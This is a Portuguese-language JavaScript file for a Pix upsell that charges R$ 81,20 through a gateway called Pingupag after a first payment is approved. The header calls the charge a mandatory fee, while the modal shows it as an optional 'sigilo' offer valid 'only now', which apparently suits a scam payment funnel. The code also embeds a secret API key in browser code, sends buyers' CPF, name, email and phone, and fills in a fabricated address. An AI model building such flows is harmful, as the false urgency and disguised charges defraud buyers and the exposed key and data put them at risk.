/**
 * Sistema de Upsell - Taxa Obrigatória (Frete + Sigilo)
 * Integração com Pingupag
 * Valor: R$ 81,20
 */

const UPSELL_CONFIG = {
    amount: 8120, // R$ 81,20 em centavos
    description: 'Serviço de Tratamento Sigiloso',
    apiKey: 'pingupag_sk_5a4a884661598e034154315cc12ce8e55ebfd026625c057dcf673b7ca7512384',
    baseURL: 'https://app.pingupag.com/gateway/v1'
};

console.log('✅ Script Upsell Pingupag carregado');

function checkAndShowUpsell() {
    console.log('Verificando se deve mostrar upsell...');
    
    const pixPaymentStatus = localStorage.getItem('pixPaymentStatus');
    const upsellAlreadyShown = localStorage.getItem('upsellTaxaObrigatoriaMostrado');
    
    if (pixPaymentStatus === 'APPROVED' && !upsellAlreadyShown) {
        console.log('Mostrando upsell...');
        
        localStorage.setItem('upsellTaxaObrigatoriaMostrado', 'true');
        
        const pixContainer = document.getElementById('pix-container');
        if (pixContainer) {
            pixContainer.style.display = 'none';
        }
        
        showUpsellModal();
    }
}

function showUpsellModal() {
    const upsellContainer = document.body;
    
    const html = `
        <div id="upsell-modal-overlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div class="bg-white rounded-lg shadow-2xl max-w-lg w-full mx-4 p-8">
                <div class="bg-gradient-to-r from-blue-600 to-blue-800 text-white p-6 rounded-t-lg -m-8 mb-6">
                    <h2 class="text-2xl font-bold mb-2">⚡ Oferta Especial: Taxa de Sigilo</h2>
                    <p class="text-blue-100">Apenas hoje - Proteção completa do seu registro</p>
                </div>
                
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
                    <p class="text-blue-900 font-semibold mb-2">✓ O que você recebe:</p>
                    <ul class="text-sm text-blue-800 space-y-2 ml-4">
                        <li>• Registro com sigilo total</li>
                        <li>• Correios com identificação discreta</li>
                        <li>• Documento em envelope lacrado</li>
                        <li>• Proteção extra para seu registro</li>
                    </ul>
                </div>
                
                <div class="text-center mb-6">
                    <p class="text-gray-600 text-sm mb-2">Valor especial de hoje:</p>
                    <div class="text-4xl font-bold text-blue-600">R$ 81,20</div>
                    <p class="text-gray-500 text-xs mt-2">Oferta válida apenas agora!</p>
                </div>
                
                <div class="space-y-3">
                    <button 
                        onclick="gerarUpsellPix()" 
                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-lg transition"
                    >
                        ✓ SIM, Quero Proteger Meu Registro
                    </button>
                    <button 
                        onclick="recusarUpsell()" 
                        class="w-full bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-4 rounded-lg"
                    >
                        Não, Obrigado
                    </button>
                </div>
                
                <p class="text-xs text-gray-500 text-center mt-4">Você pode cancelar a qualquer momento.</p>
            </div>
        </div>
    `;
    
    const container = document.createElement('div');
    container.id = 'upsell-wrapper';
    container.innerHTML = html;
    document.body.appendChild(container);
}

async function gerarUpsellPix() {
    console.log('Gerando PIX do upsell...');
    
    try {
        const userData = PINGUPAG_API.getUserData();
        const reference = `upsell_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        const payload = {
            amount: UPSELL_CONFIG.amount,
            description: 'Taxa de Sigilo - Pingupag',
            reference: reference,
            source: 'api_externa',
            customer: {
                name: userData.nome,
                email: userData.email,
                document: userData.cpf,
                phone: userData.telefone
            },
            address: {
                city: userData.cidade,
                state: userData.estado,
                street: 'Avenida Paulista',
                number: '1000',
                zipcode: '01310100'
            }
        };
        
        console.log('Enviando upsell para Pingupag...', payload);
        
        const response = await fetch(`${UPSELL_CONFIG.baseURL}/transaction`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': UPSELL_CONFIG.apiKey
            },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        
        if (data.status !== 'success') {
            throw new Error(data.message || 'Erro ao gerar PIX');
        }
        
        console.log('✅ PIX Upsell gerado:', data);
        
        localStorage.setItem('upsellPixPaymentId', data.transaction_id);
        localStorage.setItem('upsellPixPaymentData', JSON.stringify(data));
        
        showUpsellPixPayment(data);
        
    } catch (erro) {
        console.error('❌ Erro ao gerar PIX Upsell:', erro);
        alert('Erro ao gerar PIX. Tente novamente.');
    }
}

function showUpsellPixPayment(paymentData) {
    const modal = document.getElementById('upsell-modal-overlay');
    if (modal) modal.remove();
    
    const upsellWrapper = document.getElementById('upsell-wrapper');
    const pixCode = paymentData.qr_code;
    const valor = (paymentData.amount / 100).toFixed(2);
    
    const html = `
        <div id="upsell-pix-modal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
            <div class="bg-white rounded-lg shadow-2xl max-w-md w-full mx-4 p-8">
                <div class="text-center mb-6">
                    <div class="bg-blue-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-qrcode text-blue-600 text-3xl"></i>
                    </div>
                    <h2 class="text-2xl font-bold text-gray-800 mb-2">PIX da Taxa de Sigilo</h2>
                    <p class="text-2xl font-bold text-blue-600">R$ ${valor}</p>
                </div>
                
                <div class="mb-6">
                    <div id="qrcode-upsell" class="flex justify-center mb-4 p-4 bg-gray-50 rounded"></div>
                    <p class="text-sm text-gray-600 text-center">Escaneie o QR Code com seu banco</p>
                </div>
                
                <div class="mb-6">
                    <label class="block text-sm font-medium text-gray-700 mb-2">Ou copie o código:</label>
                    <div class="flex gap-2">
                        <input 
                            type="text" 
                            id="upsell-pix-code" 
                            value="${pixCode}" 
                            readonly 
                            class="flex-1 px-3 py-2 border border-gray-300 rounded text-sm font-mono"
                        >
                        <button 
                            onclick="copiarUpsellPix()" 
                            class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded font-semibold text-sm"
                        >
                            Copiar
                        </button>
                    </div>
                </div>
                
                <div class="text-center text-sm text-gray-500">
                    <i class="fas fa-spinner fa-spin text-blue-600"></i>
                    <p>Verificando pagamento...</p>
                </div>
            </div>
        </div>
    `;
    
    if (upsellWrapper) {
        upsellWrapper.innerHTML += html;
    } else {
        const container = document.createElement('div');
        container.id = 'upsell-pix-wrapper';
        container.innerHTML = html;
        document.body.appendChild(container);
    }
    
    // Gera QR Code
    try {
        new QRCode(document.getElementById('qrcode-upsell'), {
            text: pixCode,
            width: 200,
            height: 200
        });
    } catch (e) {
        console.error('Erro ao gerar QR:', e);
    }
    
    // Verifica pagamento
    startUpsellPaymentVerification(paymentData.transaction_id);
}

function copiarUpsellPix() {
    const pixCode = document.getElementById('upsell-pix-code');
    pixCode.select();
    document.execCommand('copy');
    alert('✓ PIX copiado!');
}

function startUpsellPaymentVerification(transactionId) {
    let attempts = 0;
    
    const interval = setInterval(async () => {
        attempts++;
        
        if (attempts > 360) {
            clearInterval(interval);
            return;
        }
        
        try {
            const status = await PINGUPAG_API.checkPaymentStatus(transactionId);
            
            if (status.status === 'approved') {
                console.log('✅ Upsell pagamento confirmado!');
                clearInterval(interval);
                onUpsellPaymentSuccess();
            }
        } catch (e) {
            // Silencia erros
        }
    }, 5000);
}

function onUpsellPaymentSuccess() {
    localStorage.setItem('upsellPixPaymentStatus', 'APPROVED');
    
    const modal = document.getElementById('upsell-pix-modal');
    if (modal) {
        modal.innerHTML = `
            <div class="bg-white rounded-lg shadow-2xl max-w-md w-full mx-4 p-8 text-center">
                <div class="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-check text-green-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-4">Pagamento Confirmado!</h2>
                <p class="text-gray-600 mb-6">Seu registro agora possui proteção com sigilo total.</p>
                <button 
                    onclick="location.reload()" 
                    class="bg-green-700 hover:bg-green-800 text-white px-6 py-3 rounded font-semibold w-full"
                >
                    Concluir
                </button>
            </div>
        `;
    }
}

function recusarUpsell() {
    console.log('Usuário recusou upsell');
    localStorage.setItem('upsellRecusado', 'true');
    
    const wrapper = document.getElementById('upsell-wrapper');
    if (wrapper) wrapper.remove();
    
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) pixContainer.style.display = 'block';
}

// Verifica se deve mostrar upsell
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        checkAndShowUpsell();
    }, 1000);
});
